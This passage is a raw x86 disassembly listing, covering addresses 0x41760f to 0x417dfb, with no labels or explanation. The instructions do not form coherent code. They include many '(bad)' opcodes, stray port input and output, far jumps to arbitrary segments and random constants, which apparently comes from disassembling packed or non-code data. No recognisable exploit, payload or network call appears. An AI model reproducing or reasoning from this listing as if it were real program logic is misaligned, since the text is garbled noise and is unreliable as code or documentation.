  41760f:	rcl    BYTE PTR [edi],cl
  417611:	mov    ebx,0x110c6c4b
  417616:	pop    eax
  417617:	out    0xca,eax
  417619:	into   
  41761a:	or     ebx,DWORD PTR [edx+eiz*2-0x1d97e3d2]
  417621:	(bad)  
  417622:	jle    0x4175ea
  417624:	adc    dh,BYTE PTR [edi+0x1749d66b]
  41762a:	fnstcw WORD PTR [esi]
  41762c:	imul   ebp,DWORD PTR [edx],0xdcfd9e20
  417632:	mov    dl,0x50
  417634:	out    0x7f,al
  417636:	add    ebx,ecx
  417638:	cmp    al,0x4f
  41763a:	and    al,0x0
  41763c:	mov    ebp,0x482a8ab1
  417641:	shr    DWORD PTR [ebp-0x69],cl
  417644:	mov    dl,0xe5
  417646:	push   esi
  417647:	push   esi
  417648:	ret    0x1394
  41764b:	div    DWORD PTR [eax+0x6a08009]
  417651:	push   esp
  417652:	sti    
  417653:	add    al,0x14
  417655:	xchg   ecx,eax
  417656:	aad    0x23
  417658:	dec    eax
  417659:	mov    eax,ds:0xf456f142
  41765e:	add    bh,bl
  417660:	(bad)  
  417662:	jecxz  0x417635
  417664:	imul   esp,ebp,0x5671ab67
  41766a:	test   eax,0xfa12a98d
  41766f:	push   0x35f8efa2
  417674:	sbb    BYTE PTR [ecx],ch
  417676:	enter  0xcd2a,0xc4
  41767a:	or     BYTE PTR [esi],ah
  41767c:	xor    bl,bh
  41767e:	out    dx,al
  41767f:	(bad)
  417683:	cwde   
  417684:	mov    BYTE PTR [ebx-0x57],cl
  417687:	repnz adc ecx,DWORD PTR [esi]
  41768a:	push   ebx
  41768b:	push   0xaa83dff6
  417690:	lea    eax,gs:[edx+0x56]
  417694:	scas   eax,DWORD PTR es:[edi]
  417695:	clc    
  417696:	lahf   
  417697:	lods   al,BYTE PTR ds:[esi]
  417698:	pop    ebp
  417699:	fbstp  TBYTE PTR [esi-0x50]
  41769c:	sub    eax,0x37d27a00
  4176a1:	aaa    
  4176a2:	jle    0x4176ae
  4176a4:	xchg   DWORD PTR [eax],ecx
  4176a6:	sbb    eax,0x9b373eea
  4176ab:	inc    ebp
  4176ac:	xchg   DWORD PTR [ebx],edx
  4176ae:	lods   al,BYTE PTR ds:[esi]
  4176af:	(bad)  
  4176b0:	jae    0x4176c2
  4176b2:	lea    eax,[ecx-0xd]
  4176b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176b6:	jns    0x41765e
  4176b8:	dec    esp
  4176b9:	outs   dx,DWORD PTR ds:[esi]
  4176ba:	stc    
  4176bb:	fdiv   st(5),st
  4176bd:	push   es
  4176be:	sbb    BYTE PTR ds:0x93b566bf,al
  4176c4:	mov    eax,ds:0xe649ae08
  4176c9:	daa    
  4176ca:	dec    ebx
  4176cb:	daa    
  4176cc:	pusha  
  4176cd:	daa    
  4176ce:	jns    0x417702
  4176d0:	(bad)  
  4176d1:	sbb    eax,0x89e67b67
  4176d6:	bound  esi,QWORD PTR [esi+0x6a6f4bf4]
  4176dc:	add    DWORD PTR [esi-0x54],ecx
  4176df:	popa   
  4176e0:	lahf   
  4176e1:	or     eax,0x6376afe8
  4176e6:	in     al,0x9f
  4176e8:	mov    ecx,DWORD PTR [ebx-0x1f]
  4176eb:	shr    DWORD PTR [ebp-0x6e],1
  4176ee:	lods   eax,DWORD PTR ds:[esi]
  4176ef:	not    DWORD PTR [ecx+0x7f]
  4176f2:	or     DWORD PTR [edi+ecx*8-0x23d15b48],0x28824a89
  4176fd:	jne    0x41768d
  4176ff:	mov    edi,DWORD PTR [ebx+0x3b]
  417702:	retf   
  417703:	xchg   ecx,eax
  417704:	add    eax,0x21d8a75b
  417709:	(bad)  
  41770a:	cdq    
  41770b:	ds rcr bh,cl
  41770e:	test   ch,ch
  417710:	cmp    al,0xfa
  417712:	loop   0x417746
  417714:	push   edi
  417715:	jecxz  0x4176db
  417717:	test   DWORD PTR ds:0xac5993db,edi
  41771d:	add    DWORD PTR [ecx+0x3bab83bb],0x5b
  417724:	push   esp
  417725:	mov    edx,0x2cdc6b4e
  41772a:	sub    BYTE PTR [edi-0x4bf89bc1],ah
  417730:	leave  
  417731:	inc    eax
  417732:	pop    ss
  417733:	sbb    al,0xbb
  417735:	icebp  
  417736:	(bad)
  417739:	mov    WORD PTR [edx],?
  41773b:	push   edi
  41773c:	cli    
  41773d:	inc    ebp
  41773e:	push   esp
  41773f:	not    DWORD PTR [si]
  417742:	scas   al,BYTE PTR es:[edi]
  417743:	jecxz  0x417752
  417745:	or     al,0x10
  417747:	mov    al,ds:0x718e9e17
  41774c:	push   ebx
  41774d:	cmc    
  41774e:	inc    ecx
  41774f:	inc    ecx
  417750:	xchg   esi,eax
  417751:	cmc    
  417752:	and    eax,0x1df7d344
  417757:	xor    ah,BYTE PTR [eax+0x23e8f0d8]
  41775d:	mov    WORD PTR [ecx-0x67da6516],ss
  417763:	xor    DWORD PTR [ebx],edx
  417765:	and    al,0xe3
  417767:	retf   0x8264
  41776a:	cmc    
  41776b:	add    esp,edi
  41776d:	clc    
  41776e:	js     0x41770c
  417770:	pop    eax
  417771:	sub    eax,0x2f7f8c05
  417776:	dec    ebx
  417777:	jmp    0xcd4e:0xc82f7747
  41777e:	sub    al,BYTE PTR [ebx+0x57]
  417781:	jo     0x4177a5
  417783:	mov    edi,fs
  417785:	add    DWORD PTR [esi+0x3e],0x4ef9a891
  41778c:	(bad)  
  41778d:	clc    
  41778e:	enter  0xc832,0x1f
  417792:	and    al,0x7a
  417794:	pop    edi
  417795:	pop    ds
  417796:	jb     0x4177fa
  417798:	or     al,BYTE PTR [ecx-0x34]
  41779b:	stos   BYTE PTR es:[edi],al
  41779c:	out    dx,eax
  41779d:	rol    DWORD PTR [esi+0x563495c],1
  4177a3:	push   edi
  4177a4:	cmp    eax,0xedd7e712
  4177a9:	dec    edx
  4177aa:	cmp    ecx,DWORD PTR [eax]
  4177ac:	imul   edi
  4177ae:	imul   ecx,DWORD PTR [ebp+0x3c3416be],0x143aad1f
  4177b8:	push   cs
  4177b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177ba:	inc    esp
  4177bb:	repz sub esi,ebx
  4177be:	dec    ecx
  4177bf:	les    ebx,FWORD PTR [ebx+eax*2]
  4177c2:	dec    eax
  4177c3:	xchg   DWORD PTR [esi-0x162c5af6],ebx
  4177c9:	pop    edi
  4177ca:	out    0xb6,al
  4177cc:	mov    al,ds:0xa41ea68e
  4177d1:	out    dx,al
  4177d2:	xchg   edi,eax
  4177d3:	add    BYTE PTR [ebx],bh
  4177d5:	add    cl,BYTE PTR [ebp+0x5492cad6]
  4177db:	pop    esi
  4177dc:	xor    al,BYTE PTR [ebp-0x4ba589e4]
  4177e2:	mov    gs,esp
  4177e4:	icebp  
  4177e5:	push   eax
  4177e6:	pop    eax
  4177e7:	in     eax,0xcd
  4177e9:	lds    edi,FWORD PTR [ecx]
  4177eb:	ins    DWORD PTR es:[edi],dx
  4177ec:	mov    BYTE PTR ds:0x5635fcfc,ah
  4177f2:	adc    eax,DWORD PTR [edi]
  4177f4:	add    al,0xe6
  4177f6:	ds jle 0x417796
  4177f9:	fsubr  QWORD PTR [ecx-0x31]
  4177fc:	inc    eax
  4177fd:	jb     0x4177be
  4177ff:	enter  0x568a,0x7b
  417803:	mov    ch,0x61
  417805:	mov    es,WORD PTR [eax-0x6694f5c]
  41780b:	imul   DWORD PTR [eax+edi*1]
  41780e:	int3   
  41780f:	mov    eax,ds:0xdc216b26
  417814:	iret   
  417815:	xchg   ebp,eax
  417816:	push   eax
  417817:	pushf  
  417818:	jge    0x417877
  41781a:	ins    DWORD PTR es:[edi],dx
  41781b:	lock add DWORD PTR [ecx-0xf],esp
  41781f:	fimul  DWORD PTR [ecx+0x17cbd567]
  417825:	lock call 0xb3c09d9
  41782b:	mov    edi,DWORD PTR ds:0x9b37561a
  417831:	inc    ecx
  417832:	int    0xf5
  417834:	jmp    0x6577:0x8e0470c1
  41783b:	sub    ah,BYTE PTR [ebx]
  41783d:	push   ss
  41783e:	xor    bh,BYTE PTR [eax-0x146ec7b2]
  417844:	pop    ebp
  417845:	bound  ecx,QWORD PTR [edx+0x51eb28be]
  41784b:	not    BYTE PTR [ebp+0x52]
  41784e:	(bad)  
  41784f:	pop    ebp
  417850:	dec    esi
  417851:	ret    
  417852:	mov    ah,0xe6
  417854:	popf   
  417855:	mov    ds:0x740fdfdf,eax
  41785a:	jae    0x4177de
  41785c:	popf   
  41785d:	in     al,0x34
  41785f:	loop   0x417828
  417861:	mov    al,ds:0x16236471
  417866:	or     edi,edx
  417868:	js     0x417894
  41786a:	out    dx,eax
  41786b:	test   eax,0xfe878a4d
  417870:	outs   dx,BYTE PTR ds:[esi]
  417871:	xchg   edx,eax
  417872:	push   ebx
  417873:	adc    DWORD PTR [eax-0x45],esi
  417876:	into   
  417877:	jge    0x417890
  417879:	jg     0x417817
  41787b:	pop    esp
  41787c:	jnp    0x4178c4
  41787e:	mov    dh,0x46
  417880:	fidiv  WORD PTR [ecx-0x29]
  417883:	add    edi,DWORD PTR [edx]
  417885:	cmp    DWORD PTR [edi-0x35d4375b],edx
  41788b:	ret    0x512e
  41788e:	cmp    BYTE PTR [esi+0x2f],al
  417891:	fcomp  QWORD PTR ds:0x9875f6df
  417897:	fld    TBYTE PTR [edi+eax*2]
  41789a:	lods   al,BYTE PTR ds:[esi]
  41789b:	pop    esi
  41789c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41789d:	inc    edx
  41789e:	add    cl,BYTE PTR [esi+ebx*4]
  4178a1:	fwait
  4178a2:	pop    ebx
  4178a3:	out    dx,al
  4178a4:	push   eax
  4178a5:	jne    0x41787c
  4178a7:	lds    edx,FWORD PTR [edx+0x31]
  4178aa:	xchg   esp,eax
  4178ab:	aad    0x65
  4178ad:	sub    DWORD PTR [ecx-0x603c6af4],ebp
  4178b3:	push   ebx
  4178b4:	xchg   DWORD PTR [ecx-0x4a],esp
  4178b7:	lds    ecx,FWORD PTR [eax]
  4178b9:	add    al,0x87
  4178bb:	ror    ebx,1
  4178bd:	scas   al,BYTE PTR es:[edi]
  4178be:	popf   
  4178bf:	sbb    edx,DWORD PTR [ebx+0x18]
  4178c2:	clc    
  4178c3:	mov    dl,0xb4
  4178c5:	mov    cl,0x98
  4178c7:	sar    DWORD PTR [edi],0xb6
  4178ca:	fs mov ch,0xd8
  4178cd:	dec    ecx
  4178ce:	jecxz  0x417928
  4178d0:	add    ecx,ecx
  4178d2:	(bad)  
  4178d3:	aas    
  4178d4:	push   ebp
  4178d5:	retf   
  4178d6:	hlt    
  4178d7:	inc    ebx
  4178d8:	js     0x4178e1
  4178da:	or     ecx,DWORD PTR [eax-0x6c]
  4178dd:	pop    eax
  4178de:	and    eax,0xd0181ca5
  4178e3:	xchg   edi,eax
  4178e4:	(bad)  
  4178e5:	es mov edi,0x3adb434d
  4178eb:	mov    esi,0x90d9c9d1
  4178f0:	add    al,0x9d
  4178f2:	pop    ebp
  4178f3:	(bad)  
  4178f4:	dec    ebx
  4178f5:	test   al,0x7
  4178f7:	dec    eax
  4178f8:	das    
  4178f9:	push   0xa53a3d14
  4178fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178ff:	es inc esp
  417901:	repnz outs dx,DWORD PTR ds:[esi]
  417903:	push   ebp
  417904:	mov    ebp,0x2b02a5fe
  417909:	mov    al,0xdc
  41790b:	sbb    al,ch
  41790d:	xor    al,0xc7
  41790f:	retf   0x5846
  417912:	push   esp
  417913:	leave  
  417914:	jecxz  0x4178c7
  417916:	test   BYTE PTR [ebx],ch
  417918:	jbe    0x41790a
  41791a:	imul   ecx,eax,0x6eff8068
  417920:	mov    eax,0x8e8557f6
  417925:	mov    bl,0xa5
  417927:	cld    
  417928:	aas    
  417929:	sub    ebp,DWORD PTR [ebp+0x4d61dfc2]
  41792f:	cmp    BYTE PTR [edi+0x63942c02],bh
  417935:	cmp    al,0xb3
  417937:	mov    al,0x54
  417939:	fwait
  41793a:	test   eax,0x7896fe7f
  41793f:	(bad)  
  417940:	fst    QWORD PTR [ecx-0x38]
  417943:	dec    ebx
  417944:	pop    ecx
  417945:	mov    dl,0x99
  417947:	mov    al,0x99
  417949:	cmp    BYTE PTR [ebx+edx*4-0x28],dl
  41794d:	stos   DWORD PTR es:[edi],eax
  41794e:	lods   al,BYTE PTR ds:[esi]
  41794f:	inc    edx
  417950:	push   es
  417951:	xchg   esp,eax
  417952:	pop    ss
  417953:	iret   
  417954:	jl     0x4178f7
  417956:	scas   eax,DWORD PTR es:[edi]
  417957:	jmp    0x3cbd:0x86860ea7
  41795e:	adc    edx,DWORD PTR [ebp+0x47]
  417961:	mov    edx,0xbe411ac3
  417966:	js     0x417942
  417968:	xor    edi,ebx
  41796a:	(bad)  
  41796b:	lods   eax,DWORD PTR ds:[esi]
  41796c:	sub    ch,dl
  41796e:	and    eax,0x19bda411
  417973:	sbb    al,0xc4
  417975:	cmp    esi,eax
  417977:	xor    bl,BYTE PTR [ebx+0x46aeb92a]
  41797d:	outs   dx,BYTE PTR ds:[esi]
  41797e:	shl    BYTE PTR [edx+eax*4],0x81
  417982:	in     eax,dx
  417983:	fs pop ebx
  417985:	fcom   DWORD PTR [ebx-0x40]
  417988:	nop
  417989:	jnp    0x417976
  41798b:	lea    esi,[ebx-0x4]
  41798e:	(bad)  
  41798f:	lahf   
  417990:	out    dx,eax
  417991:	loope  0x41792a
  417993:	mov    WORD PTR [esp+eiz*4+0x6f87a00f],fs
  41799a:	or     BYTE PTR [eax-0x3a],bh
  41799d:	mov    ch,BYTE PTR ss:0x7210ee5e
  4179a4:	pop    edx
  4179a5:	jmp    0x53b3:0x63c9317b
  4179ac:	fmul   DWORD PTR [eax]
  4179ae:	in     eax,0x7
  4179b0:	pop    edx
  4179b1:	or     ebp,DWORD PTR [edi+eiz*1]
  4179b4:	(bad)  
  4179b5:	xor    al,0xb3
  4179b7:	mov    cl,0xda
  4179b9:	jg     0x417973
  4179bb:	sub    al,0x5d
  4179bd:	cmp    eax,0x57aac2ef
  4179c2:	sub    al,0xed
  4179c4:	sub    bh,BYTE PTR [eax+0x3d]
  4179c7:	out    dx,eax
  4179c8:	test   eax,0x1811d799
  4179cd:	xchg   ecx,eax
  4179ce:	(bad)  
  4179cf:	push   0xffffffc9
  4179d1:	push   ss
  4179d2:	push   eax
  4179d3:	mov    gs,WORD PTR [ebx-0x13]
  4179d6:	(bad)  
  4179d7:	or     ecx,ebp
  4179d9:	pop    ebp
  4179da:	push   0xffa1d23c
  4179df:	inc    ebp
  4179e0:	and    ecx,ebp
  4179e2:	dec    edx
  4179e3:	sub    dl,ch
  4179e5:	or     al,0x80
  4179e7:	ins    DWORD PTR es:[edi],dx
  4179e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179e9:	pop    ss
  4179ea:	add    al,0x21
  4179ec:	pop    ss
  4179ed:	mov    DWORD PTR ds:0xb4ae617e,esp
  4179f3:	retf   0x3ba6
  4179f6:	and    al,BYTE PTR [esp+ecx*8]
  4179f9:	retf   
  4179fa:	jl     0x417a71
  4179fc:	arpl   WORD PTR [ecx],bp
  4179fe:	cmp    al,0x25
  417a00:	stos   DWORD PTR es:[edi],eax
  417a01:	arpl   WORD PTR [edi-0x3a17877d],dx
  417a07:	mov    DWORD PTR [edx+0x457e7046],edi
  417a0d:	enter  0x380b,0xe7
  417a11:	imul   eax,DWORD PTR [esi],0xffffffd4
  417a14:	shl    edi,cl
  417a16:	rol    BYTE PTR [esi-0x64],0xd2
  417a1a:	mov    edi,0x3f37c492
  417a1f:	jp     0x417a30
  417a21:	inc    ebx
  417a22:	shl    edx,0x73
  417a25:	iret   
  417a26:	and    eax,0x4b43e1de
  417a2b:	aas    
  417a2c:	lock es inc ebp
  417a2f:	fsubr  DWORD PTR [esi-0x61]
  417a32:	push   0xffffff90
  417a34:	mov    ds:0x58403757,eax
  417a39:	and    DWORD PTR [eax+0x370fb85],edx
  417a3f:	sub    BYTE PTR [ebx+0x628a7389],dl
  417a45:	das    
  417a46:	mov    edi,0xe20567d4
  417a4b:	outs   dx,DWORD PTR ds:[esi]
  417a4c:	xlat   BYTE PTR ds:[ebx]
  417a4d:	pop    esi
  417a4e:	xor    BYTE PTR [edi-0x1a],0xe6
  417a52:	rcr    DWORD PTR [eax-0x1a],cl
  417a55:	sub    ebp,ebp
  417a57:	xor    eax,0x8fad2dab
  417a5c:	aam    0x4a
  417a5e:	(bad)  
  417a5f:	pop    ebx
  417a60:	cdq    
  417a61:	jo     0x417a10
  417a63:	ret    
  417a64:	or     eax,0x7132f26f
  417a69:	ror    DWORD PTR [edi-0x56],1
  417a6c:	and    eax,0x802db701
  417a71:	xor    DWORD PTR [ebp-0x49],0x10
  417a75:	add    ecx,eax
  417a77:	add    BYTE PTR [ebx-0x3c],al
  417a7a:	repz mov ecx,0x56da3d20
  417a80:	jbe    0x417ab9
  417a82:	into   
  417a83:	or     BYTE PTR [ebx+eax*4-0x37f3dca0],ah
  417a8a:	mov    edi,0x6f6f929a
  417a8f:	mul    cl
  417a91:	cmp    al,0x5f
  417a93:	retf   0xbe3d
  417a96:	loopne 0x417a9b
  417a98:	pushf  
  417a99:	pop    esp
  417a9a:	pusha  
  417a9b:	ss mov esi,0x2c6daad3
  417aa1:	aam    0x2a
  417aa3:	adc    esp,eax
  417aa5:	add    al,0x87
  417aa7:	pushf  
  417aa8:	xchg   esi,eax
  417aa9:	test   eax,0x32ad8ed5
  417aae:	or     eax,0x8f382133
  417ab3:	fist   WORD PTR [eax+0x5e]
  417ab6:	pushf  
  417ab7:	xchg   BYTE PTR [ecx-0x23],bl
  417aba:	dec    esi
  417abb:	or     esi,DWORD PTR [ebp+0x24]
  417abe:	imul   esp,ebx,0xffffff8d
  417ac1:	mov    edi,0x84b90c8d
  417ac6:	adc    BYTE PTR [edx],ch
  417ac8:	ss lahf 
  417aca:	push   ebx
  417acb:	cli    
  417acc:	sub    bl,ch
  417ace:	push   es
  417acf:	cdq    
  417ad0:	iret   
  417ad1:	sbb    ebp,DWORD PTR [esi]
  417ad3:	push   esi
  417ad4:	out    0xa6,al
  417ad6:	gs sahf 
  417ad8:	or     ecx,DWORD PTR [eax]
  417ada:	xchg   BYTE PTR [esi+0x35],ch
  417add:	fst    QWORD PTR [ebx+0x59999429]
  417ae3:	sbb    dh,dh
  417ae5:	enter  0x858e,0xdd
  417ae9:	or     al,0xbf
  417aeb:	fs jp  0x417b0b
  417aee:	or     ebp,DWORD PTR ds:0xda2b6987
  417af4:	sbb    ah,BYTE PTR [ebp-0x588c90cb]
  417afa:	sbb    eax,DWORD PTR [edx+0x37]
  417afd:	nop
  417afe:	stos   DWORD PTR es:[edi],eax
  417aff:	aam    0x9b
  417b01:	adc    BYTE PTR [ebx-0x75],ah
  417b04:	add    eax,0x7c5033dc
  417b09:	xor    dl,bl
  417b0b:	mov    bh,0xbd
  417b0d:	div    BYTE PTR [esi]
  417b0f:	jbe    0x417ad7
  417b11:	cmp    eax,0xc5bded51
  417b16:	sub    eax,0x4f3ca833
  417b1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b1c:	and    al,0x38
  417b1e:	(bad)  
  417b1f:	sub    ecx,edi
  417b21:	pop    edx
  417b22:	aaa    
  417b23:	out    dx,al
  417b24:	(bad)  
  417b25:	fist   WORD PTR [edi+ebp*8+0x36]
  417b29:	repnz lahf 
  417b2b:	fisub  DWORD PTR [ecx+edi*2+0x2568af25]
  417b32:	jne    0x417ba5
  417b34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b36:	pop    ebx
  417b37:	xchg   edi,eax
  417b38:	and    esi,ebx
  417b3a:	ds sbb al,0x3e
  417b3d:	and    DWORD PTR [ebp-0x41a4b462],ebx
  417b43:	pop    ds
  417b44:	xor    eax,0x70e6945f
  417b49:	test   DWORD PTR [edi],ecx
  417b4b:	mov    ecx,0x2533bdcd
  417b50:	xlat   BYTE PTR ds:[ebx]
  417b51:	test   eax,0x3d594380
  417b56:	lahf   
  417b57:	fwait
  417b58:	bound  esp,QWORD PTR [edx+0x251da2da]
  417b5e:	mov    bl,0xa1
  417b60:	sbb    BYTE PTR [edx+0x50],0x6b
  417b64:	mov    WORD PTR [edx*8-0x19d5f17],cs
  417b6b:	adc    eax,0xffffff83
  417b6e:	fimul  WORD PTR [esi]
  417b70:	mov    eax,ds:0x5066ddb3
  417b75:	in     eax,dx
  417b76:	test   al,0x36
  417b78:	dec    edi
  417b79:	cmp    eax,edx
  417b7b:	rol    DWORD PTR [edx-0x4b0ac9ad],0x13
  417b82:	dec    eax
  417b83:	fidivr WORD PTR [ebp+ebx*4+0x8afabf0]
  417b8a:	adc    BYTE PTR [ebp+ecx*8-0x724011d0],ch
  417b91:	sar    esp,0xba
  417b94:	push   es
  417b95:	adc    BYTE PTR [eax],cl
  417b97:	dec    edx
  417b98:	jmp    0x6c97:0x213c0a16
  417b9f:	pop    es
  417ba0:	dec    ecx
  417ba1:	dec    edi
  417ba2:	mov    BYTE PTR [edi+ebp*1-0x50],ah
  417ba6:	xor    DWORD PTR [esi-0x35566940],ecx
  417bac:	lea    edx,[ebx]
  417bae:	add    BYTE PTR [eax+0x5d4f8300],bh
  417bb4:	push   ds
  417bb5:	imul   esi,eax,0x52
  417bb8:	fiadd  DWORD PTR [edi+eiz*8-0x3e16850d]
  417bbf:	xchg   edx,eax
  417bc0:	dec    edx
  417bc1:	mov    ecx,0x8fdeb343
  417bc6:	jmp    0x417beb
  417bc8:	push   cs
  417bc9:	dec    ecx
  417bca:	sbb    edi,DWORD PTR [eax]
  417bcc:	jns    0x417b6d
  417bce:	xchg   BYTE PTR [ebx],dh
  417bd0:	es sbb eax,0x39d668d5
  417bd6:	or     edi,DWORD PTR [eax+0x3ae7d274]
  417bdc:	cmp    DWORD PTR [ebp+0x7e655c86],0x12d35c93
  417be6:	jne    0x417c5c
  417be8:	mov    WORD PTR [ecx-0x25],ss
  417beb:	adc    DWORD PTR [edx-0x72b3ae1f],ecx
  417bf1:	cmp    ah,BYTE PTR [eax+0x1b]
  417bf4:	xchg   esi,eax
  417bf5:	dec    esi
  417bf6:	add    al,0xc
  417bf8:	mov    cl,0xc8
  417bfa:	(bad)  
  417bfb:	push   esi
  417bfc:	outs   dx,DWORD PTR ds:[esi]
  417bfd:	push   esi
  417bfe:	nop
  417bff:	mov    esp,ss
  417c01:	aas    
  417c02:	mov    edi,DWORD PTR [esi+0xd3c5a88]
  417c08:	jo     0x417c28
  417c0a:	mov    ebp,0xbca8850
  417c0f:	daa    
  417c10:	out    dx,al
  417c11:	mov    bl,al
  417c13:	inc    bp
  417c15:	xlat   BYTE PTR ds:[ebx]
  417c16:	test   DWORD PTR [eax-0x4a91fd1b],esi
  417c1c:	sbb    DWORD PTR [eax-0x1fb76af1],ebx
  417c22:	pushf  
  417c23:	dec    eax
  417c24:	pusha  
  417c25:	call   0xcadceb25
  417c2a:	jmp    0x417c54
  417c2c:	mov    al,ds:0x63c38ab6
  417c31:	pusha  
  417c32:	lea    esi,[eax-0x19364089]
  417c38:	cmp    bl,BYTE PTR [edi+0x44]
  417c3b:	popa   
  417c3c:	je     0x417c60
  417c3e:	mov    ds:0x4f4abbab,eax
  417c43:	arpl   WORD PTR [edi-0x388e2e1f],bx
  417c49:	imul   edi,DWORD PTR [esi],0x5c
  417c4c:	cmp    ebx,DWORD PTR [ebx+0x7b]
  417c4f:	mov    esi,0x7868922a
  417c54:	push   ebx
  417c55:	push   es
  417c56:	sbb    cl,BYTE PTR [edi+0x60971068]
  417c5c:	mov    DWORD PTR [esi+esi*4+0x3f1634c],ebx
  417c63:	cmp    DWORD PTR [edi+esi*2+0x1eb3c010],0x53c1d5af
  417c6e:	in     eax,0x56
  417c70:	leave  
  417c71:	mov    dl,0xbb
  417c73:	adc    eax,0x456a993d
  417c78:	es mov ebx,0x2634abb0
  417c7e:	sbb    edx,ebx
  417c80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c81:	jb     0x417c6a
  417c83:	(bad)  [ebp+0x3b]
  417c86:	adc    BYTE PTR [esi-0x3ada5c99],0xaa
  417c8d:	push   esi
  417c8e:	and    BYTE PTR [edx],dh
  417c90:	sahf   
  417c91:	gs dec edx
  417c93:	cmp    al,0x25
  417c95:	jmp    DWORD PTR [eax+0x492e74f3]
  417c9b:	rcr    BYTE PTR [eax-0xf45af09],1
  417ca1:	ror    BYTE PTR ds:0x146f592d,cl
  417ca7:	xor    al,0x85
  417ca9:	imul   esp,DWORD PTR [ecx+0x4f],0xe744f2b8
  417cb0:	jge    0x417ce7
  417cb2:	xchg   ebp,ebx
  417cb4:	push   edi
  417cb5:	inc    ebp
  417cb6:	cmp    ebx,esi
  417cb8:	or     eax,0xdf132a67
  417cbd:	mov    al,0x3e
  417cbf:	push   ecx
  417cc0:	(bad)  
  417cc1:	add    ebp,DWORD PTR [ebx]
  417cc3:	mov    cl,0xa4
  417cc5:	outs   dx,DWORD PTR ds:[esi]
  417cc6:	push   esp
  417cc7:	data16 mov ah,BYTE PTR ds:[esi-0x5e]
  417ccc:	mov    BYTE PTR [eax],dl
  417cce:	jecxz  0x417cf2
  417cd0:	popa   
  417cd1:	xor    BYTE PTR [ebp+0x9],bl
  417cd4:	pop    esi
  417cd5:	imul   ebp,DWORD PTR [eax-0x65db12de],0xe55463c9
  417cdf:	add    BYTE PTR [edx+0x4f],bh
  417ce2:	ret    0xb1ec
  417ce5:	mov    ds:0xad29a638,al
  417cea:	sbb    eax,0xd7c042c1
  417cef:	sub    BYTE PTR [ecx-0x7],0x24
  417cf3:	retf   
  417cf4:	jns    0x417c80
  417cf6:	shl    DWORD PTR [ebx-0x663d9649],0x73
  417cfd:	sub    eax,0x387472f8
  417d02:	fidiv  DWORD PTR [edi+0x2654242c]
  417d08:	jns    0x417d82
  417d0a:	into   
  417d0b:	push   ss
  417d0c:	inc    dl
  417d0e:	addr16 pop ds
  417d10:	cmp    DWORD PTR [ecx-0x12],esp
  417d13:	retf   
  417d14:	add    cl,BYTE PTR [edx-0x5b]
  417d17:	icebp  
  417d18:	retf   
  417d19:	xchg   ecx,eax
  417d1a:	out    dx,eax
  417d1b:	stos   BYTE PTR es:[edi],al
  417d1c:	test   eax,0x5a1e265a
  417d21:	out    0xac,eax
  417d23:	mov    WORD PTR [ecx-0x4422ce7d],es
  417d29:	enter  0xfc1,0xca
  417d2d:	mov    dl,0xf2
  417d2f:	jp     0x417d21
  417d31:	or     ah,BYTE PTR [ebp+0x2606334d]
  417d37:	call   0x363b:0xd820d47c
  417d3e:	mov    al,ds:0x3dd8a122
  417d43:	out    dx,eax
  417d44:	jp     0x417d40
  417d46:	lea    edx,[edx+0x3ddbcd89]
  417d4c:	cmp    eax,0xa4e0bbd8
  417d51:	les    ebx,FWORD PTR [ebx]
  417d53:	sbb    BYTE PTR [ebp-0x391daa21],0x95
  417d5a:	test   BYTE PTR [esi+0x4162f4ac],bl
  417d60:	fst    QWORD PTR [eax+esi*4-0x60c354]
  417d67:	cwde   
  417d68:	repnz cdq 
  417d6a:	adc    DWORD PTR [edx+0x6caac44e],ecx
  417d70:	and    al,BYTE PTR [esi+0x4e4f3949]
  417d76:	fisttp WORD PTR [ecx+0x4ed525b3]
  417d7c:	pop    edi
  417d7d:	stos   BYTE PTR es:[edi],al
  417d7e:	push   cs
  417d7f:	dec    ebx
  417d80:	scas   al,BYTE PTR es:[edi]
  417d81:	pusha  
  417d82:	jo     0x417d0c
  417d84:	xchg   BYTE PTR [eax+eiz*1+0x6e72faeb],dl
  417d8b:	cli    
  417d8c:	xchg   BYTE PTR [edi-0x3f],dl
  417d8f:	mov    ebx,0x18094aae
  417d94:	int3   
  417d95:	or     ch,BYTE PTR [ecx]
  417d97:	mov    WORD PTR [edi],?
  417d99:	or     DWORD PTR [edx-0x53],ebx
  417d9c:	retf   0xe2bc
  417d9f:	call   0x873f:0x6e0e1f44
  417da6:	cdq    
  417da7:	repnz out 0x2,eax
  417daa:	sti    
  417dab:	test   al,0x19
  417dad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dae:	pop    edi
  417daf:	inc    ebx
  417db0:	pop    es
  417db1:	or     edx,DWORD PTR [edi+esi*1-0x92b0130]
  417db8:	push   ds
  417db9:	js     0x417d78
  417dbb:	mov    cl,0x1c
  417dbd:	test   al,0x37
  417dbf:	lods   al,BYTE PTR ds:[esi]
  417dc0:	clc    
  417dc1:	inc    ecx
  417dc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417dc3:	dec    eax
  417dc4:	fs xchg ebx,eax
  417dc6:	bound  ebx,QWORD PTR [esi-0x50]
  417dc9:	pop    esp
  417dca:	ins    DWORD PTR es:[edi],dx
  417dcb:	lods   eax,DWORD PTR ds:[esi]
  417dcc:	jnp    0x417e09
  417dce:	xchg   edx,eax
  417dcf:	jno    0x417e09
  417dd1:	add    al,0xcb
  417dd3:	cwde   
  417dd4:	rcr    DWORD PTR [ebx+0x51],1
  417dd7:	aam    0x53
  417dd9:	rcr    DWORD PTR [edi-0x23],cl
  417ddc:	mov    ebp,0xb19a8f1d
  417de1:	int    0xf2
  417de3:	test   BYTE PTR [esi-0x7e],cl
  417de6:	lds    edi,FWORD PTR [edx+0x7c6b2a5b]
  417dec:	fcomp  QWORD PTR [eax+edx*8]
  417def:	add    eax,DWORD PTR [esi+0x21e9cd01]
  417df5:	mov    ecx,0xc1af2f47
  417dfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
